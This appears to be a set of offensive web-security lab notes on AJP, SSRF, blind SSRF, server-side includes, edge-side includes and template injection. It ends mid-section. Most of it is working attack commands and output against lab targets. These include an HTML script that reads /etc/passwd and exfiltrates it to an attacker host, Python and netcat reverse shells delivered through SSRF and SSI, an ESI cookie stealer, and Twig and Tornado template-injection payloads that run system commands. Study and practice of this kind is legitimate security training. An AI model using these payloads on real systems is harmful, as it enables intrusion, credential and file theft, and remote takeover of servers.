## Nginx Reverse Proxy & AJP

When we come across an open AJP proxy port (8009 TCP), we can use Nginx with the ajp_module to access the "hidden" Tomcat Manager. This can be done by compiling the Nginx source code and adding the required module, as follows:

    Download the Nginx source code
    Download the required module
    Compile Nginx source code with the ajp_module.
    Create a configuration file pointing to the AJP Port

#### Download Nginx Source Code
```Shell
wget https://nginx.org/download/nginx-1.21.3.tar.gz
```

```Shell
tar -xzvf nginx-1.21.3.tar.gz
```

#### Compile Nginx source code with the ajp module
```Shell
git clone https://github.com/dvershinin/nginx_ajp_module.git
```

```Shell
cd nginx-1.21.3
```

```Shell
apt install libpcre3-dev
```

```Shell
./configure --add-module="`pwd`/../nginx_ajp_module" --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
```

```Shell
make
```

```Shell
make install
```

```Shell
nginx -V
```
#### Comment out the entire `server` block and append the following lines inside the `http` block in `/etc/nginx/nginx.conf`
```
upstream tomcats {
	server <TARGET_SERVER>:8009;
	keepalive 10;
	}
server {
	listen 80;
	location / {
		ajp_keep_conn on;
		ajp_pass tomcats;
	}
}
```
#### Start nginx server
```Shell
nginx
```
#### Connect to AJP Server
```Shell
curl http://127.0.0.1:8080
```
## SSRF
### Where to look for SSRF:
#### 1: Parts of HTTP requests, including URLs
#### 2: File imports such as HTML, PDFs, images, etc.
#### 3: Remote server connections to fetch data
#### 4: API specifications imports
#### 5: Dashboards including ping and similar functionalities to check server statuses

### Example Attack Flow:
|`[RED TEAM OPERATOR]`|`🠖`|`[EXERCISE-TARGET]--[SSRF]`|`🠖`|`[INTERNAL-WEBSERVER]--[SSRF]`|`🠖`|`[LOCALHOST WEBAPP]`|`🠖`|`[RCE]`|
|---|---|---|---|---|---|---|---|---|
#### Port Scan
```Shell
nmap -sT -T5 --min-rate=10000 -p- 10.129.201.238
```
Output:
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```
#### Issue a cURL request to the target server
```Shell
curl -i -s http://10.129.201.238
```
- `-i`: Shows the protocol response headers
- `-s`: Silent mode
Output:
```
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python
Date: Mon, 18 Oct 2021 09:01:02 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/load?q=index.html">/load?q=index.html</a>. If not click the link.
```
The request redirected to `/load?q=index.html`, meaning the `q` parameter fetches the resource `index.html`
#### Use cURL to follow the redirect
```Shell
curl -i -s -L http://10.129.201.238
```
- `-L`: Follows redirects
Output:
```
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 153
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

<html>
<!-- ubuntu-web.lalaguna.local & internal.app.local load resources via q parameter -->
<body>
<h1>Bad App</h1>
<a>Hello World!</a>
</body>
</html>
```
The spawned target is `ubunut-web.lalaguna.local`, and `internal.app.local` is an application on the internal network (inaccessible from our current position)
### Test to see if `q` parameter is vulnerable to SSRF
#### Start a netcat listener on attack host
```Shell
nc -lnvp 8080
```
#### Issue a cURL request to the target web application with `http://<your IP>:8080` instead of `index.html`
```Shell
curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"
```
Output in netcat listener:
```
listening on [any] 8080 ...
connect to [10.10.15.176] from (UNKNOWN) [10.129.201.238] 49818
GET / HTTP/1.1
Accept-Encoding: identity
Host: 10.10.15.176:8080
User-Agent: Python-urllib/3.8
Connection: close
```
This shows the targetr is vulnerable to SSRF
### Enumerating the server using SSRF
Reading the [Python-urllib documentation](https://docs.python.org/3.8/library/urllib.html), we can see it supports `file`,` http `and` ftp` schemas. So, apart from issuing HTTP requests to other services on behalf of the target application, we can also read local files via the `file` schema and remote files using `ftp`.
#### 1. Create a file called `index.html`
```
<html>
</body>
<a>SSRF</a>
<body>
<html>
```
#### 2. Inside the directory where `index.html` is located, start an HTTP server using the following command
```Shell
python3 -m http.server 9090
```
#### 3. Inside the directory where `index.html` is located, start an FTP server using the following command
```Shell
sudo pip3 install twisted
```

```Shell
sudo python3 -m twisted ftp -p 21 -r .
```

#### 4. Retrieve `index.html` through the target application using the ftp schema, as follows
```Shell
curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"
```
Output:
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 40
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 17 Oct 2023 16:26:29 GMT

<html>
</body>
<a>SSRF</a>
<body>
<html>
```
#### 5. Retrieve `index.html` through the target application - HTTP Schema
```Shell
curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"
```
Output:
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 41
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:26:18 GMT

<html>
</body>
<a>SSRF</a>
<body>
<html>
```
#### 6. Retrieve a local file through the target application
```Shell
curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd" 
```
Bear in mind that fetching remote HTML files can lead to Reflected XSS
### Conduct internal port scan of target server
#### 1. Generate a wordlist containing all possible ports
```Shell
for port in {1..65535}; do echo $port >> ports.txt;done
```
#### 2. Issue a cURL request to a random port to get the response size of a request for a non-existent service
```Shell
curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"
```
Output:
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 30
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:36:25 GMT

[Errno 111] Connection refused
```
#### 3. Use ffuf with the wordlist and discard the responses which have the size we previously identified.
```Shell
ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30
```
==OPSEC: To maintain better OPSEC, look to probe individual ports based on what is likely to be running on an internal web server==
#### 4. Use cURL to interact with port 5000
```Shell
curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000"
```
Output: 
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 64
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 17 Oct 2023 16:41:33 GMT

<html><body><h1>Hey!</h1><a>Some internal app!</a></body></html>
```
### Target `internal.app.local`
#### Issue cURL request to test redirection w/ SSRF to `internal.app.local`
```Shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"
```
Output:
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 83
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 13:51:15 GMT

<html>
<body>
<h1>Internal Web Application</h1>
<a>Hello World!</a>
</body>
</html>
```
#### Test ports with cURL
```Shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"
```
Output:
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 97
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:52:32 GMT

<html><body><h1>Resource: http127.0.0.1:1</h1><a>unknown url type: http127.0.0.1</a></body></html>
```
We have received an `unknown url type` error message. It seems the web application is removing `:// `from our request.
#### Modify to test port again
```Shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"
```
Output:
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 99
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:55:10 GMT

<html><body><h1>Resource: http://127.0.0.1:1</h1><a>[Errno 111] Connection refused</a></body></html>
```
#### Use ffuf to scan ports
```Shell
ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'
```
Port 5000 is open on this as well
#### Interact with the target on open ports using cURL
```Shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"
```
### Enumerate source code of the web apps listening on `internal.app.local`
#### Issue a request to disclose `/proc/self/environ` file, where the current path should be present under the `PWD` environment variable
```Shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -
```
Output shows current path is `/app`
#### Retrieving a local file through the target application - File Schema
```Shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"
```
By studying the source code above, we notice a functionality that allows us to execute commands on the remote host sending a GET request to `/runme?x=<CMD>`.
Output:
```
@app.route("/runme")
def runmewithargs():
    command = request.args.get("x")
    if command == "":
        return "Use /runme?x=<CMD>"
    return run_command(command)
```
#### Use cURL to execute RCE
```Shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"
```
Output:
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 94
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 17 Oct 2023 17:00:45 GMT

<html><body><h1>Resource: http://127.0.0.1:5000/runme?x=whoami</h1><a>root
 </a></body></html>
```
#### Execute commands with arguments
```Shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"
```
Unable to do so
### Enable URL encoding. This will require encoding three times.
#### Install JQ
```Shell
apt-get install jq
```
#### Encode a string with JQ to test for URL encoding
```Shell
echo "encode me" | jq -sRr @uri
```
#### Create a bash function to automate executing commands on the target application
```Shell
function rce() {
while true; do
echo -n "# "; read cmd
ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
echo ""
done
}
```
#### Call the function and execute commands
```Shell
rce
# uname -a; hostname; whoami
```
Output:
```
<html><body><h1>Resource: http://127.0.0.1:5000/runme?x=uname%20-a%3B%20hostname%3B%20whoami
</h1><a>Linux a054d48cc0a4 5.8.0-63-generic #71-Ubuntu SMP Tue Jul 13 15:59:12 UTC 2021 x86_64 GNU/Linux
a054d48cc0a4
root
 </a></body></html>
```
## Blind SSRF
To detect if a backend service is processing our requests, we can either use a server with a public IP address that we own or services such as:

    Burp Collaborator (Part of Burp Suite professional. Not Available in the community edition)
    http://pingb.in
Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations.
#### Enumerate the web application
![[blind ssrf upload.png]]

If we upload various HTML files and inspect the responses, we will notice that the application returns the same response regardless of the structure and content of the submitted files. In addition, we cannot observe any response related to the processing of the submitted HTML file on the front end.

![[blind ssrf burp response.png]]
#### Create an HTML file containing a link to a service under our control to test if the application is vulnerable to a blind SSRF vulnerability
```html
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://<SERVICE IP>:<PORT>/x?=viaimgtag">
</body>
</html>
```
This service can be a web server hosted in a machine we own, Burp Collaborator, a Pingb.in URL etc. Please note that the protocols we can use when utilizing out-of-band techniques include HTTP, DNS, FTP, etc.
#### For this example, use a Netcat listener running on port 9090
```Shell
nc -nlvp 9090
```
Output:
```
listening on [any] 9090 ...
connect to [10.10.15.176] from (UNKNOWN) [10.129.201.238] 34142
GET /x?=viaimgtag HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.10.15.176:9090
```
By inspecting the request, we notice `wkhtmltopdf` in the User-Agent. If we browse wkhtmltopdf's downloads webpage, the below statement catches our attention:

`"Do not use wkhtmltopdf with any untrusted HTML – be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details."`

This means we can execute JavaScript in wkhtmltopdf
#### Create HTML file w/ embedded JavaScript to read a local file
```html
<html>
	<body>
		<b>Exfiltration via Blind SSRF</b>
		<script>
		var readfile = new XMLHttpRequest(); // Read the local file
		var exfil = new XMLHttpRequest(); // Send the file to our server
		readfile.open("GET","file:///etc/passwd", true);
		readfile.send(); // Initiate the request to read the file content asynchronously
		readfile.onload = function () { // Executes when the request to read the file completes
			if (readfile.readyState === 4) { // readyState 4 is READYSTATE_COMPLETE
				var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response); // base64 encoded
				exfil.open("GET", url, true);
				exfil.send(); // Request is sent to URL
			}
		}
		readfile.onerror = function(){document.write('<a>Oops!</a>');} // Error handling
		</script>
	</body>
</html>
```
#### Start a netcat listener on port 9090
```Shell
nc -nlvp 9090
```
#### Upload the file to the server
#### Decode the base64 response
```Shell
echo """cm9vdDp4OjA6MDpyb290Oi9yb<SNIP>""" | base64 -d
```
#### *Refer to previous internal web app (`internal.app.local`) for the next exercise*
- This time you will create an HTML document with a valid payload for exploiting the local application listening on `internal.app.local`
#### Create a Bash Reverse Shell
```Shell
export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
#### URL Encode it twice
```
export%2520RHOST%253D%252210.10.15.176%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527
```
#### Create an HTML file that performs a GET request to internal.app.local, reaches the local application vulnerable to remote code execution via SSRF, and executes our reverse shell
```html
<html>
	<body>
		<b>Reverse Shell via Blind SSRF</b>
		<script>
		var http = new XMLHttpRequest();
		http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.15.176%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true);
		http.send();
		http.onerror = function(){document.write('<a>Oops!</a>');}
		</script>
	</body>
</html>
```
#### Start a netcat listener and upload the file
```Shell
nc -lnvp 9090
```
Output:
```
listening on [any] 9090 ...
Connection received on 10.129.201.238 33100

# whoami

whoami
root
```
## Time-Based SSRF
#### Submit the following document to an application (e.g., pdf) and observe the response time
```HTML
<html>
	<body>
		<b>Time-Based Blind SSRF</b>
		<img src="http://blah.nonexistent.com">
	</body>
</html>
```

![[timebased 1.png]]
We can see the service took 10 seconds to respond to the request. If we submit a valid URL inside the HTML document, it will take less time to respond. Remember that `internal.app.local` was a valid internal application (that we could access through SSRF in the previous section).

![[timebased 2.png]]
In some situations, the application may fail immediately instead of taking more time to respond. For this reason, we need to observe the time differences between requests carefully.
## Server-Side Includes
### Values to submit in forms
#### Date
```HTML
<!--#echo var="DATE_LOCAL" -->
```
#### Modification date of a file
```html
<!--#flastmod file="index.html" -->
```
#### CGI Program Results
```html
<!--#include virtual="/cgi-bin/counter.pl" -->
```
#### Including a footer
```html
<!--#include virtual="/footer.html" -->
```
#### Executing Commands
```html
<!--#exec cmd="ls" -->
```
#### Setting Variables
```html
<!--#set var="name" value="Rich" -->
```
#### Including Virtual Files (Same Directory)
```html
<!--#include virtual="file_to_include.html" -->
```
#### Including Files (Same Directory)
```html
<!--#include file="file_to_include.html" -->
```
#### Print all Variables
```html
<!--#printenv -->
```
### Injection Exploitation Form
![[SSI Example Form.png]]
#### Injects
```html
<!--#echo var="DATE_LOCAL" -->
```

```html
<!--#printenv -->
```
![[dtg ssi.png]]
#### Reverse Shell
```html
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```
- `mkfifo /tmp/foo`: Create a FIFO special file in` /tmp/foo`
- `nc <IP> <PORT> 0</tmp/foo`: Connect to the pentester machine and redirect the standard input descriptor
- `| bin/bash 1>/tmp/foo`: Execute /bin/bash redirecting the standard output descriptor to `/tmp/foo
- `rm /tmp/foo`: Cleanup the FIFO file`
#### Execute other commands
```HTML
<!--#exec cmd="ls -la" -->
```

```html
<!--#exec cmd="cat .htaccess.flag" -->
```

## Edge-Side Includes (ESI)
### ESI Tags for detecting ESI Injection
#### Basic detection
```html
<esi: include src=http://<PENTESTER IP>>
```
#### XSS Exploitation Example
```html
<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>
```
#### Cookie Stealer (bypass httpOnly flag)
```HTML
<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>
```
#### Introduce private local files (Not LFI per se)
```html
<esi:include src="supersecret.txt">
```
#### Valid for Akamai, sends debug information in the response
```html
<esi:debug/>
```

In some cases, we can achieve remote code execution when the application processing ESI directives supports XSLT by passing `dca=xslt` to the payload

|**Software**|**Includes**|**Vars**|**Cookies**|**Upstream Headers Required**|**Host Whitelist**|
|:-:|:-:|:-:|:-:|:-:|:-:|
|Squid3|Yes|Yes|Yes|Yes|No|
|Varnish Cache|Yes|No|No|Yes|Yes|
|Fastly|Yes|No|No|No|Yes|
|Akamai ESI Test Server (ETS)|Yes|Yes|Yes|No|No|
|NodeJS esi|Yes|Yes|Yes|No|No|
|NodeJS nodesi|Yes|No|No|No|Optional|
- Includes: Supports the `<esi:includes>` directive
- Vars: Supports the `<esi:vars>` directive. Useful for bypassing XSS Filters
- Cookie: Document cookies are accessible to the ESI engine
- Upstream Headers Required: Surrogate applications will not process ESI statements unless the upstream application provides the headers
- Host Allowlist: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts

## Server-Side Template Injections (SSTI)
![[SSTI Flow Chart.png]]
#### Mathematical Expressions for detecting SSTI
```html
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}
...
```
Looking for it to respond with an output of "49"
### SSTI Exploitation - Example 1
![[ssti inject form.png]]

![[ssti success.png]]
The "49" output indicates the form field may be vulnerable to SSTI. The user's input is submitted via the `name` parameter and through a POST request
#### Input `{{7*'7'}}` to determine template engine
Success indicates it's either a Jinja2 or a Twig template engine
#### Twig-specific payload
```php
{{_self.env.display("TEST")}}
```
![[Twig inject SSTI.png]]
The field is a Twig engine
#### For an extensive list of template engine-specific payloads, please refer to the following resources:
- [PayloadsAllTheThings - Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks - SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
#### Downloading tplmap.py
```Shell
git clone https://github.com/epinna/tplmap.git
```

```Shell
cd tplmap
```

```Shell
pip install virtualenv
```

```Shell
virtualenv -p python2 venv
```

```Shell
source venv/bin/activate
```

```Shell
pip install -r requirements.txt
```
#### Running tplmap.py
```Shell
./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john
```
`-d` pertains to the data being submitted as a POST request
#### Gaining RCE w/ cURL
```Shell
curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET IP>:<PORT
```
- `registerUndefinedFilterCallback` registers a function as a filter callback
- `_self.env.getFilter()` executes the function we have just registered
#### Getting a Reverse Shell using tplmap.py
```Shell
./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell
```

*Can also test for XSS*
`name:"{{<svg/onload=confirm()>}}"`
### SSTI Exploitation - Example 2
#### Interacting with the target using cURL (`${7*7}`)
```Shell
curl -X POST -d 'email=${7*7}' http://94.237.51.1:52450/jointheteam
```
Unsuccessful
#### Interacting with the target using cURL (`{{7*7}}`)
```Shell
curl -X POST -d 'email={{7*7}}' http://94.237.51.1:52450/jointheteam
```
Successful
#### Identify underlying template engine
```Shell
curl -X POST -d 'email={{7*'7'}}' http://94.237.51.1:52450/jointheteam
```
#### Twig and Jinja2 payloads didn't work
#### Tornado specific payload
```Shell
curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://94.237.51.1:52450/jointheteam
```
Successful
#### Using tplmap.py to automate the process
```Shell
./tplmap.py -u 'http://94.237.51.1:52450/jointheteam' -d email=blah
```
### SSTI Exploitation - Example 3
![[ssti 3 first image.png]]
User input is submitted via the cmd parameter through a GET request.
#### Submit a mathematical expression in curly brackets in the input field
```Shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={7*7}"
```
#### Try again with `${7*7}`
```Shell
curl -gs 'http://<TARGET IP>:<PORT>/execute?cmd=${7*7}'
```
#### Try `{{7*7}}`
```Shell
curl -gs "http://$tgt/execute?cmd={{7*7}}"
```
#### Identify the template engine the application is utilizing
```Shell
curl -gs "http://$tgt/execute?cmd={{7*'7'}}"
```
Output: `7777777`. We are dealing with a Jinja2 backend.
#### A small dictionary from [fatalerrors.org](https://www.fatalerrors.org/a/0dhx1Dk.html) to refer to when going over the Jinja2 payload development part of this section:
|**No.**|**Methods**|**Description**|
|---|---|---|
|1.|`__class__`|Returns the object (class) to which the type belongs|
|2.|`__mro__`|Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples.|
|3.|`__subclasses__`|Each new class retains references to subclasses, and this method returns a list of references that are still available in the class|
|4.|`__builtins__`|Returns the builtin methods included in a function|
|5.|`__globals__`|A reference to a dictionary that contains global variables for a function|
|6.|`__base__`|Returns the base class inherited by the object <-- (__ base__ and __ mro__ are used to find the base class)|
|7.|`__init__`|Class initialization method|
#### Start a Python3 Interpreter
```Shell
python3
```
#### Create a string object and use `type` and `__class__`, as follows. Then use the `dir()` command to show all methods and attributes from the object
```Python
import flask
s = 'HTB'
type(s)
```

```
<class 'str'>
```

```Python
s.__class__
```

```
<class 'str'>
```

```Python
dir(s)
```

```
['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']
```
#### Next you want to understand Python's hierarchy. Using `__mro__` or `mro()`, you can go back up the tree of inherited objects in the Python environment.
```Python
s.__class__.__class__
```

```
<class 'type'>
```

```Python
s.__class__.__base__
```

```
<class 'object'>
```

```Python
s.__class__.__base__.__subclasses__()
```

```
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 <SNIP>
```

```Python
s.__class__.mro()[1].__subclasses__()
```

```
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 <SNIP>
```
#### Look for useful classes that can facilitate remote code execution
```Python
x = s.__class__.mro()[1].__subclasses__()
```

```Python
for i in range(len(x)):print(i, x[i].__name__)
```

```
...
0 type
1 weakref
2 weakcallableproxy
3 weakproxy
4 int
5 bytearray
6 bytes
7 list
8 NoneType
<SNIP>

>>> def searchfunc(name):
...     x = s.__class__.mro()[1].__subclasses__()
...     for i in range(len(x)):
...             fn = x[i].__name__
...             if fn.find(name) > -1:
...                     print(i, fn)
...
>>> searchfunc('warning')

215 catch_warnings
```
Why are we searching for `warning` you may ask. We chose this class because it imports Python's [sys module](https://github.com/python/cpython/blob/3.9/Lib/warnings.py#L3) , and from `sys`, the `os` module can be reached. More precisely, os modules are all from `warnings.catch_`.

In example: `140 catch_warnings`
#### Enumerate the builtins from this class
```Python
y = x[140]
y
```

```
<class 'warnings.catch_warnings'>
```

```Python
y()._module_.__builtins__
```

```
{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>,
 <SNIP>
```

```Python
z = y()._module.__builtins__
```

```Python
for i in z:
	if i.find('import') >-1:
		print(i, z[i])
```

```
__import__ <built-in function __import__>
```
It seems we have reached the import function by walking the hierarchy.
#### We can load `os` and use the `system` function to execute code all coming from a string object
```Python
''.__class__.__mro__[1].__subclasses__()
```

```
[215]()._module.__builtins__['__import__']('os').system('echo RCE from a string object')
RCE from a string object
0
```
#### Return to the web application and see how you can repeat the process and develop an RCE payload
```Python
{{ ''.__class__ }}
```
#### Use as a URL encoded payload with cURL
```Shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"
```
No success
#### Try the next in the hierarchy
```Python
{{ ''.__class__.__mro__ }}
```
#### Use as a URL encoded payload with cURL
```Shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"
```
Still no success
#### Try next in the hierarchy
```Python
{{ ''.__class__.__mro__[1] }}
```
#### Use as a URL encoded payload with cURL
```Shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D%20%7D%7D"
```
No success
#### Try next in the hierarchy
```Python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
#### Use as a URL encoded payload with cURL
```Shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"
```
#### Print out the number and the method names using the following payload
```Python
{% for i in range(450) %}
{{ i }}
{{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }}
{% endfor %}
```
#### Use as a URL encoded payload with cURL
```Shell
